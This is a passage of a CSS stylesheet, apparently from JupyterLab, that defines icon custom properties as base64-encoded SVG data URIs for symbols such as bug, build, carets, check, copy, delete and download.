SAxNi43NCA3LjIyIDE3LjE5IDhaTTEwIDE2SDE0VjE0SDEwVjE2Wk0xMCAxMkgxNFYxMEgxMFYxMloiIGZpbGw9IiM2MTYxNjEiLz4KICAgICAgICA8cGF0aCBkPSJNMjIgMTguNUMyMiAyMC40MzMgMjAuNDMzIDIyIDE4LjUgMjJDMTYuNTY3IDIyIDE1IDIwLjQzMyAxNSAxOC41QzE1IDE2LjU2NyAxNi41NjcgMTUgMTguNSAxNUMyMC40MzMgMTUgMjIgMTYuNTY3IDIyIDE4LjVaIiBmaWxsPSIjNjE2MTYxIi8+CiAgICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-bug: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjNjE2MTYxIj4KICAgIDxwYXRoIGQ9Ik0yMCA4aC0yLjgxYy0uNDUtLjc4LTEuMDctMS40NS0xLjgyLTEuOTZMMTcgNC40MSAxNS41OSAzbC0yLjE3IDIuMTdDMTIuOTYgNS4wNiAxMi40OSA1IDEyIDVjLS40OSAwLS45Ni4wNi0xLjQxLjE3TDguNDEgMyA3IDQuNDFsMS42MiAxLjYzQzcuODggNi41NSA3LjI2IDcuMjIgNi44MSA4SDR2MmgyLjA5Yy0uMDUuMzMtLjA5LjY2LS4wOSAxdjFINHYyaDJ2MWMwIC4zNC4wNC42Ny4wOSAxSDR2MmgyLjgxYzEuMDQgMS43OSAyLjk3IDMgNS4xOSAzczQuMTUtMS4yMSA1LjE5LTNIMjB2LTJoLTIuMDljLjA1LS4zMy4wOS0uNjYuMDktMXYtMWgydi0yaC0ydi0xYzAtLjM0LS4wNC0uNjctLjA5LTFIMjBWOHptLTYgOGgtNHYtMmg0djJ6bTAtNGgtNHYtMmg0djJ6Ii8+CiAgPC9nPgo8L3N2Zz4K);
  --jp-icon-build: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTE0LjkgMTcuNDVDMTYuMjUgMTcuNDUgMTcuMzUgMTYuMzUgMTcuMzUgMTVDMTcuMzUgMTMuNjUgMTYuMjUgMTIuNTUgMTQuOSAxMi41NUMxMy41NCAxMi41NSAxMi40NSAxMy42NSAxMi40NSAxNUMxMi40NSAxNi4zNSAxMy41NCAxNy40NSAxNC45IDE3LjQ1Wk0yMC4xIDE1LjY4TDIxLjU4IDE2Ljg0QzIxLjcxIDE2Ljk1IDIxLjc1IDE3LjEzIDIxLjY2IDE3LjI5TDIwLjI2IDE5LjcxQzIwLjE3IDE5Ljg2IDIwIDE5LjkyIDE5LjgzIDE5Ljg2TDE4LjA5IDE5LjE2QzE3LjczIDE5LjQ0IDE3LjMzIDE5LjY3IDE2LjkxIDE5Ljg1TDE2LjY0IDIxLjdDMTYuNjIgMjEuODcgMTYuNDcgMjIgMTYuMyAyMkgxMy41QzEzLjMyIDIyIDEzLjE4IDIxLjg3IDEzLjE1IDIxLjdMMTIuODkgMTkuODVDMTIuNDYgMTkuNjcgMTIuMDcgMTkuNDQgMTEuNzEgMTkuMTZMOS45NjAwMiAxOS44NkM5LjgxMDAyIDE5LjkyIDkuNjIwMDIgMTkuODYgOS41NDAwMiAxOS43MUw4LjE0MDAyIDE3LjI5QzguMDUwMDIgMTcuMTMgOC4wOTAwMiAxNi45NSA4LjIyMDAyIDE2Ljg0TDkuNzAwMDIgMTUuNjhMOS42NTAwMSAxNUw5LjcwMDAyIDE0LjMxTDguMjIwMDIgMTMuMTZDOC4wOTAwMiAxMy4wNSA4LjA1MDAyIDEyLjg2IDguMTQwMDIgMTIuNzFMOS41NDAwMiAxMC4yOUM5LjYyMDAyIDEwLjEzIDkuODEwMDIgMTAuMDcgOS45NjAwMiAxMC4xM0wxMS43MSAxMC44NEMxMi4wNyAxMC41NiAxMi40NiAxMC4zMiAxMi44OSAxMC4xNUwxMy4xNSA4LjI4OTk4QzEzLjE4IDguMTI5OTggMTMuMzIgNy45OTk5OCAxMy41IDcuOTk5OThIMTYuM0MxNi40NyA3Ljk5OTk4IDE2LjYyIDguMTI5OTggMTYuNjQgOC4yODk5OEwxNi45MSAxMC4xNUMxNy4zMyAxMC4zMiAxNy43MyAxMC41NiAxOC4wOSAxMC44NEwxOS44MyAxMC4xM0MyMCAxMC4wNyAyMC4xNyAxMC4xMyAyMC4yNiAxMC4yOUwyMS42NiAxMi43MUMyMS43NSAxMi44NiAyMS43MSAxMy4wNSAyMS41OCAxMy4xNkwyMC4xIDE0LjMxTDIwLjE1IDE1TDIwLjEgMTUuNjhaIi8+CiAgICA8cGF0aCBkPSJNNy4zMjk2NiA3LjQ0NDU0QzguMDgzMSA3LjAwOTU0IDguMzM5MzIgNi4wNTMzMiA3LjkwNDMyIDUuMjk5ODhDNy40NjkzMiA0LjU0NjQzIDYuNTA4MSA0LjI4MTU2IDUuNzU0NjYgNC43MTY1NkM1LjM5MTc2IDQuOTI2MDggNS4xMjY5NSA1LjI3MTE4IDUuMDE4NDkgNS42NzU5NEM0LjkxMDA0IDYuMDgwNzEgNC45NjY4MiA2LjUxMTk4IDUuMTc2MzQgNi44NzQ4OEM1LjYxMTM0IDcuNjI4MzIgNi41NzYyMiA3Ljg3OTU0IDcuMzI5NjYgNy40NDQ1NFpNOS42NTcxOCA0Ljc5NTkzTDEwLjg2NzIgNC45NTE3OUMxMC45NjI4IDQuOTc3NDEgMTEuMDQwMiA1LjA3MTMzIDExLjAzODIgNS4xODc5M0wxMS4wMzg4IDYuOTg4OTNDMTEuMDQ1NSA3LjEwMDU0IDEwLjk2MTYgNy4xOTUxOCAxMC44NTUgNy4yMTA1NEw5LjY2MDAxIDcuMzgwODNMOS4yMzkxNSA4LjEzMTg4TDkuNjY5NjEgOS4yNTc0NUM5LjcwNzI5IDkuMzYyNzEgOS42NjkzNCA5LjQ3Njk5IDkuNTc0MDggOS41MzE5OUw4LjAxNTIzIDEwLjQzMkM3LjkxMTMxIDEwLjQ5MiA3Ljc5MzM3IDEwLjQ2NzcgNy43MjEwNSAxMC4zODI0TDYuOTg3NDggOS40MzE4OEw2LjEwOTMxIDkuNDMwODNMNS4zNDcwNCAxMC4zOTA1QzUuMjg5MDkgMTAuNDcwMiA1LjE3MzgzIDEwLjQ5MDUgNS4wNzE4NyAxMC40MzM5TDMuNTEyNDUgOS41MzI5M0MzLjQxMDQ5IDkuNDc2MzMgMy4zNzY0NyA5LjM1NzQxIDMuNDEwNzUgOS4yNTY3OUwzLjg2MzQ3IDguMTQwOTNMMy42MTc0OSA3Ljc3NDg4TDMuNDIzNDcgNy4zNzg4M0wyLjIzMDc1IDcuMjEyOTdDMi4xMjY0NyA3LjE5MjM1IDIuMDQwNDkgNy4xMDM0MiAyLjA0MjQ1IDYuOTg2ODJMMi4wNDE4NyA1LjE4NTgyQzIuMDQzODMgNS4wNjkyMiAyLjExOTA5IDQuOTc5NTggMi4yMTcwNCA0Ljk2OTIyTDMuNDIwNjUgNC43OTM5M0wzLjg2NzQ5IDQuMDI3ODhMMy40MTEwNSAyLjkxNzMxQzMuMzczMzcgMi44MTIwNCAzLjQxMTMxIDIuNjk3NzYgMy41MTUyMyAyLjYzNzc2TDUuMDc0MDggMS43Mzc3NkM1LjE2OTM0IDEuNjgyNzYgNS4yODcyOSAxLjcwNzA0IDUuMzU5NjEgMS43OTIzMUw2LjExOTE1IDIuNzI3ODhMNi45ODAwMSAyLjczODkzTDcuNzI0OTYgMS43ODkyMkM3Ljc5MTU2IDEuNzA0NTggNy45MTU0OCAxLjY3OTIyIDguMDA4NzkgMS43NDA4Mkw5LjU2ODIxIDIuNjQxODJDOS42NzAxNyAyLjY5ODQyIDkuNzEyODUgMi44MTIzNCA5LjY4NzIzIDIuOTA3OTdMOS4yMTcxOCA0LjAzMzgzTDkuNDYzMTYgNC4zOTk4OEw5LjY1NzE4IDQuNzk1OTNaIi8+CiAgPC9nPgo8L3N2Zz4K);
  --jp-icon-caret-down-empty-thin: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIwIDIwIj4KCTxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSIgc2hhcGUtcmVuZGVyaW5nPSJnZW9tZXRyaWNQcmVjaXNpb24iPgoJCTxwb2x5Z29uIGNsYXNzPSJzdDEiIHBvaW50cz0iOS45LDEzLjYgMy42LDcuNCA0LjQsNi42IDkuOSwxMi4yIDE1LjQsNi43IDE2LjEsNy40ICIvPgoJPC9nPgo8L3N2Zz4K);
  --jp-icon-caret-down-empty: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDE4IDE4Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiIHNoYXBlLXJlbmRlcmluZz0iZ2VvbWV0cmljUHJlY2lzaW9uIj4KICAgIDxwYXRoIGQ9Ik01LjIsNS45TDksOS43bDMuOC0zLjhsMS4yLDEuMmwtNC45LDVsLTQuOS01TDUuMiw1Ljl6Ii8+CiAgPC9nPgo8L3N2Zz4K);
  --jp-icon-caret-down: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDE4IDE4Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiIHNoYXBlLXJlbmRlcmluZz0iZ2VvbWV0cmljUHJlY2lzaW9uIj4KICAgIDxwYXRoIGQ9Ik01LjIsNy41TDksMTEuMmwzLjgtMy44SDUuMnoiLz4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-caret-left: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDE4IDE4Ij4KCTxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSIgc2hhcGUtcmVuZGVyaW5nPSJnZW9tZXRyaWNQcmVjaXNpb24iPgoJCTxwYXRoIGQ9Ik0xMC44LDEyLjhMNy4xLDlsMy44LTMuOGwwLDcuNkgxMC44eiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-caret-right: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDE4IDE4Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiIHNoYXBlLXJlbmRlcmluZz0iZ2VvbWV0cmljUHJlY2lzaW9uIj4KICAgIDxwYXRoIGQ9Ik03LjIsNS4yTDEwLjksOWwtMy44LDMuOFY1LjJINy4yeiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-caret-up-empty-thin: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIwIDIwIj4KCTxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSIgc2hhcGUtcmVuZGVyaW5nPSJnZW9tZXRyaWNQcmVjaXNpb24iPgoJCTxwb2x5Z29uIGNsYXNzPSJzdDEiIHBvaW50cz0iMTUuNCwxMy4zIDkuOSw3LjcgNC40LDEzLjIgMy42LDEyLjUgOS45LDYuMyAxNi4xLDEyLjYgIi8+Cgk8L2c+Cjwvc3ZnPgo=);
  --jp-icon-caret-up: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDE4IDE4Ij4KCTxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSIgc2hhcGUtcmVuZGVyaW5nPSJnZW9tZXRyaWNQcmVjaXNpb24iPgoJCTxwYXRoIGQ9Ik01LjIsMTAuNUw5LDYuOGwzLjgsMy44SDUuMnoiLz4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-case-sensitive: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIwIDIwIj4KICA8ZyBjbGFzcz0ianAtaWNvbjIiIGZpbGw9IiM0MTQxNDEiPgogICAgPHJlY3QgeD0iMiIgeT0iMiIgd2lkdGg9IjE2IiBoZWlnaHQ9IjE2Ii8+CiAgPC9nPgogIDxnIGNsYXNzPSJqcC1pY29uLWFjY2VudDIiIGZpbGw9IiNGRkYiPgogICAgPHBhdGggZD0iTTcuNiw4aDAuOWwzLjUsOGgtMS4xTDEwLDE0SDZsLTAuOSwySDRMNy42LDh6IE04LDkuMUw2LjQsMTNoMy4yTDgsOS4xeiIvPgogICAgPHBhdGggZD0iTTE2LjYsOS44Yy0wLjIsMC4xLTAuNCwwLjEtMC43LDAuMWMtMC4yLDAtMC40LTAuMS0wLjYtMC4yYy0wLjEtMC4xLTAuMi0wLjQtMC4yLTAuNyBjLTAuMywwLjMtMC42LDAuNS0wLjksMC43Yy0wLjMsMC4xLTAuNywwLjItMS4xLDAuMmMtMC4zLDAtMC41LDAtMC43LTAuMWMtMC4yLTAuMS0wLjQtMC4yLTAuNi0wLjNjLTAuMi0wLjEtMC4zLTAuMy0wLjQtMC41IGMtMC4xLTAuMi0wLjEtMC40LTAuMS0wLjdjMC0wLjMsMC4xLTAuNiwwLjItMC44YzAuMS0wLjIsMC4zLTAuNCwwLjQtMC41QzEyLDcsMTIuMiw2LjksMTIuNSw2LjhjMC4yLTAuMSwwLjUtMC4xLDAuNy0wLjIgYzAuMy0wLjEsMC41LTAuMSwwLjctMC4xYzAuMiwwLDAuNC0wLjEsMC42LTAuMWMwLjIsMCwwLjMtMC4xLDAuNC0wLjJjMC4xLTAuMSwwLjItMC4yLDAuMi0wLjRjMC0xLTEuMS0xLTEuMy0xIGMtMC40LDAtMS40LDAtMS40LDEuMmgtMC45YzAtMC40LDAuMS0wLjcsMC4yLTFjMC4xLTAuMiwwLjMtMC40LDAuNS0wLjZjMC4yLTAuMiwwLjUtMC4zLDAuOC0wLjNDMTMuMyw0LDEzLjYsNCwxMy45LDQgYzAuMywwLDAuNSwwLDAuOCwwLjFjMC4zLDAsMC41LDAuMSwwLjcsMC4yYzAuMiwwLjEsMC40LDAuMywwLjUsMC41QzE2LDUsMTYsNS4yLDE2LDUuNnYyLjljMCwwLjIsMCwwLjQsMCwwLjUgYzAsMC4xLDAuMSwwLjIsMC4zLDAuMmMwLjEsMCwwLjIsMCwwLjMsMFY5Ljh6IE0xNS4yLDYuOWMtMS4yLDAuNi0zLjEsMC4yLTMuMSwxLjRjMCwxLjQsMy4xLDEsMy4xLTAuNVY2Ljl6Ii8+CiAgPC9nPgo8L3N2Zz4K);
  --jp-icon-check: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjNjE2MTYxIj4KICAgIDxwYXRoIGQ9Ik05IDE2LjE3TDQuODMgMTJsLTEuNDIgMS40MUw5IDE5IDIxIDdsLTEuNDEtMS40MXoiLz4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-circle-empty: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTEyIDJDNi40NyAyIDIgNi40NyAyIDEyczQuNDcgMTAgMTAgMTAgMTAtNC40NyAxMC0xMFMxNy41MyAyIDEyIDJ6bTAgMThjLTQuNDEgMC04LTMuNTktOC04czMuNTktOCA4LTggOCAzLjU5IDggOC0zLjU5IDgtOCA4eiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-circle: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMTggMTgiIHdpZHRoPSIxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPGNpcmNsZSBjeD0iOSIgY3k9IjkiIHI9IjgiLz4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-clear: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8bWFzayBpZD0iZG9udXRIb2xlIj4KICAgIDxyZWN0IHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgZmlsbD0id2hpdGUiIC8+CiAgICA8Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSI4IiBmaWxsPSJibGFjayIvPgogIDwvbWFzaz4KCiAgPGcgY2xhc3M9ImpwLWljb24zIiBmaWxsPSIjNjE2MTYxIj4KICAgIDxyZWN0IGhlaWdodD0iMTgiIHdpZHRoPSIyIiB4PSIxMSIgeT0iMyIgdHJhbnNmb3JtPSJyb3RhdGUoMzE1LCAxMiwgMTIpIi8+CiAgICA8Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIgbWFzaz0idXJsKCNkb251dEhvbGUpIi8+CiAgPC9nPgo8L3N2Zz4K);
  --jp-icon-close: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbi1ub25lIGpwLWljb24tc2VsZWN0YWJsZS1pbnZlcnNlIGpwLWljb24zLWhvdmVyIiBmaWxsPSJub25lIj4KICAgIDxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjExIi8+CiAgPC9nPgoKICA8ZyBjbGFzcz0ianAtaWNvbjMganAtaWNvbi1zZWxlY3RhYmxlIGpwLWljb24tYWNjZW50Mi1ob3ZlciIgZmlsbD0iIzYxNjE2MSI+CiAgICA8cGF0aCBkPSJNMTkgNi40MUwxNy41OSA1IDEyIDEwLjU5IDYuNDEgNSA1IDYuNDEgMTAuNTkgMTIgNSAxNy41OSA2LjQxIDE5IDEyIDEzLjQxIDE3LjU5IDE5IDE5IDE3LjU5IDEzLjQxIDEyeiIvPgogIDwvZz4KCiAgPGcgY2xhc3M9ImpwLWljb24tbm9uZSBqcC1pY29uLWJ1c3kiIGZpbGw9Im5vbmUiPgogICAgPGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iNyIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-code-check: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjNjE2MTYxIiBzaGFwZS1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiI+CiAgICA8cGF0aCBkPSJNNi41OSwzLjQxTDIsOEw2LjU5LDEyLjZMOCwxMS4xOEw0LjgyLDhMOCw0LjgyTDYuNTksMy40MU0xMi40MSwzLjQxTDExLDQuODJMMTQuMTgsOEwxMSwxMS4xOEwxMi40MSwxMi42TDE3LDhMMTIuNDEsMy40MU0yMS41OSwxMS41OUwxMy41LDE5LjY4TDkuODMsMTZMOC40MiwxNy40MUwxMy41LDIyLjVMMjMsMTNMMjEuNTksMTEuNTlaIiAvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-code: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIiIGhlaWdodD0iMjIiIHZpZXdCb3g9IjAgMCAyOCAyOCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KCTxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CgkJPHBhdGggZD0iTTExLjQgMTguNkw2LjggMTRMMTEuNCA5LjRMMTAgOEw0IDE0TDEwIDIwTDExLjQgMTguNlpNMTYuNiAxOC42TDIxLjIgMTRMMTYuNiA5LjRMMTggOEwyNCAxNEwxOCAyMEwxNi42IDE4LjZWMTguNloiLz4KCTwvZz4KPC9zdmc+Cg==);
  --jp-icon-collapse-all: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgIDxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CiAgICAgICAgPHBhdGgKICAgICAgICAgICAgZD0iTTggMmMxIDAgMTEgMCAxMiAwczIgMSAyIDJjMCAxIDAgMTEgMCAxMnMwIDItMiAyQzIwIDE0IDIwIDQgMjAgNFMxMCA0IDYgNGMwLTIgMS0yIDItMnoiIC8+CiAgICAgICAgPHBhdGgKICAgICAgICAgICAgZD0iTTE4IDhjMC0xLTEtMi0yLTJTNSA2IDQgNnMtMiAxLTIgMmMwIDEgMCAxMSAwIDEyczEgMiAyIDJjMSAwIDExIDAgMTIgMHMyLTEgMi0yYzAtMSAwLTExIDAtMTJ6bS0yIDB2MTJINFY4eiIgLz4KICAgICAgICA8cGF0aCBkPSJNNiAxM3YyaDh2LTJ6IiAvPgogICAgPC9nPgo8L3N2Zz4K);
  --jp-icon-console: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIwMCAyMDAiPgogIDxnIGNsYXNzPSJqcC1jb25zb2xlLWljb24tYmFja2dyb3VuZC1jb2xvciBqcC1pY29uLXNlbGVjdGFibGUiIGZpbGw9IiMwMjg4RDEiPgogICAgPHBhdGggZD0iTTIwIDE5LjhoMTYwdjE1OS45SDIweiIvPgogIDwvZz4KICA8ZyBjbGFzcz0ianAtY29uc29sZS1pY29uLWNvbG9yIGpwLWljb24tc2VsZWN0YWJsZS1pbnZlcnNlIiBmaWxsPSIjZmZmIj4KICAgIDxwYXRoIGQ9Ik0xMDUgMTI3LjNoNDB2MTIuOGgtNDB6TTUxLjEgNzdMNzQgOTkuOWwtMjMuMyAyMy4zIDEwLjUgMTAuNSAyMy4zLTIzLjNMOTUgOTkuOSA4NC41IDg5LjQgNjEuNiA2Ni41eiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-copy: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMTggMTgiIHdpZHRoPSIxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTExLjksMUgzLjJDMi40LDEsMS43LDEuNywxLjcsMi41djEwLjJoMS41VjIuNWg4LjdWMXogTTE0LjEsMy45aC04Yy0wLjgsMC0xLjUsMC43LTEuNSwxLjV2MTAuMmMwLDAuOCwwLjcsMS41LDEuNSwxLjVoOCBjMC44LDAsMS41LTAuNywxLjUtMS41VjUuNEMxNS41LDQuNiwxNC45LDMuOSwxNC4xLDMuOXogTTE0LjEsMTUuNWgtOFY1LjRoOFYxNS41eiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-copyright: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDI0IDI0IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCI+CiAgPGcgY2xhc3M9ImpwLWljb24zIiBmaWxsPSIjNjE2MTYxIj4KICAgIDxwYXRoIGQ9Ik0xMS44OCw5LjE0YzEuMjgsMC4wNiwxLjYxLDEuMTUsMS42MywxLjY2aDEuNzljLTAuMDgtMS45OC0xLjQ5LTMuMTktMy40NS0zLjE5QzkuNjQsNy42MSw4LDksOCwxMi4xNCBjMCwxLjk0LDAuOTMsNC4yNCwzLjg0LDQuMjRjMi4yMiwwLDMuNDEtMS42NSwzLjQ0LTIuOTVoLTEuNzljLTAuMDMsMC41OS0wLjQ1LDEuMzgtMS42MywxLjQ0QzEwLjU1LDE0LjgzLDEwLDEzLjgxLDEwLDEyLjE0IEMxMCw5LjI1LDExLjI4LDkuMTYsMTEuODgsOS4xNHogTTEyLDJDNi40OCwyLDIsNi40OCwyLDEyczQuNDgsMTAsMTAsMTBzMTAtNC40OCwxMC0xMFMxNy41MiwyLDEyLDJ6IE0xMiwyMGMtNC40MSwwLTgtMy41OS04LTggczMuNTktOCw4LThzOCwzLjU5LDgsOFMxNi40MSwyMCwxMiwyMHoiLz4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-cut: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTkuNjQgNy42NGMuMjMtLjUuMzYtMS4wNS4zNi0xLjY0IDAtMi4yMS0xLjc5LTQtNC00UzIgMy43OSAyIDZzMS43OSA0IDQgNGMuNTkgMCAxLjE0LS4xMyAxLjY0LS4zNkwxMCAxMmwtMi4zNiAyLjM2QzcuMTQgMTQuMTMgNi41OSAxNCA2IDE0Yy0yLjIxIDAtNCAxLjc5LTQgNHMxLjc5IDQgNCA0IDQtMS43OSA0LTRjMC0uNTktLjEzLTEuMTQtLjM2LTEuNjRMMTIgMTRsNyA3aDN2LTFMOS42NCA3LjY0ek02IDhjLTEuMSAwLTItLjg5LTItMnMuOS0yIDItMiAyIC44OSAyIDItLjkgMi0yIDJ6bTAgMTJjLTEuMSAwLTItLjg5LTItMnMuOS0yIDItMiAyIC44OSAyIDItLjkgMi0yIDJ6bTYtNy41Yy0uMjggMC0uNS0uMjItLjUtLjVzLjIyLS41LjUtLjUuNS4yMi41LjUtLjIyLjUtLjUuNXpNMTkgM2wtNiA2IDIgMiA3LTdWM3oiLz4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-delete: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgd2lkdGg9IjE2cHgiIGhlaWdodD0iMTZweCI+CiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIiAvPgogICAgPHBhdGggY2xhc3M9ImpwLWljb24zIiBmaWxsPSIjNjI2MjYyIiBkPSJNNiAxOWMwIDEuMS45IDIgMiAyaDhjMS4xIDAgMi0uOSAyLTJWN0g2djEyek0xOSA0aC0zLjVsLTEtMWgtNWwtMSAxSDV2MmgxNFY0eiIgLz4KPC9zdmc+Cg==);
  --jp-icon-download: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTE5IDloLTRWM0g5djZINWw3IDcgNy03ek01IDE4djJoMTR2LTJINXoiLz4KICA8L2c+Cjwvc3ZnPgo=);
